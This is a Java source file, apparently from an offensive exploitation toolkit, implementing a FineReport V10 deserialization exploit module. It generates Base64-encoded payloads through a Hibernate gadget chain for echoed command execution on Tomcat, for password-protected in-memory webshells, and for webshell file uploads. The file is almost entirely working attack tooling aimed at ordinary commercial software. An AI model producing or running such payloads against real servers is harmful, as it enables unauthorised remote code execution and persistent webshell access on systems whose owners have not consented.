package com.droplab.Controller.FineReport.Service;

import com.droplab.Controller.FineReport.Common.FinereportV10Hibernatel;
import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.Echo.TomcatEcho;
import com.droplab.Utils.Factory.CodeFactory;
import com.droplab.Utils.Memory.MemroyFactory;
import com.droplab.Utils.ResponseUtils;
import com.droplab.service.BugService;

import java.io.File;
import java.util.Base64;
import java.util.Iterator;

public class V10Unserialize extends BugService {
    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String mOption = null;
                String filepath = null;
                String filename = null;
                String mType = null;
                String mMiddle = null;
                String path = null;
                String mshellType = null;
                String password = null;
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("filepath")) {
                        filepath = params.get(key);
                    } else if (key.equals("filename")) {
                        filename = params.get(key);
                    } else if (key.equals("mType")) {
                        mType = params.get(key);
                    } else if (key.equals("mMiddle")) {
                        mMiddle = params.get(key);
                    } else if (key.equals("path")) {
                        path = params.get(key);
                    } else if (key.equals("mshellType")) {
                        mshellType = params.get(key);
                    } else if (key.equals("password")) {
                        password = params.get(key);
                    } else if (key.equals("mOption")) {
                        mOption = params.get(key);
                    }
                }
                if (!mOption.equals("")) {
                    String code = null;
                    switch (mOption) {
                        case "Execute": //回显命令执行
                            if (mType.equals("Tomcat")) {
                                code = TomcatEcho.instance().getTomcatEchoExecString("template");
                            } else {

                            }
                            break;
                        case "MemoryShell":
                            code = MemroyFactory.instance().getMemoryShell(mType, mMiddle, password, mshellType, path,true);
                            break;
                        case "UploadShell":
                        default:
                            if (new File(filepath).exists()) {
                                code = CodeFactory.instance().getUploadShell("template", "com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer", filename, new File(filepath));
                            }
                            break;
                    }
                    if (code != null) {
                        byte[] decode = Base64.getDecoder().decode(code);
                        byte[] object = FinereportV10Hibernatel.instance().getObject(decode);//帆软10反序列化专用反序列化链

                        ResponseUtils responseUtils = new ResponseUtils();
                        responseUtils.setMessage(java.util.Base64.getEncoder().encodeToString(object));
                        return responseUtils;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
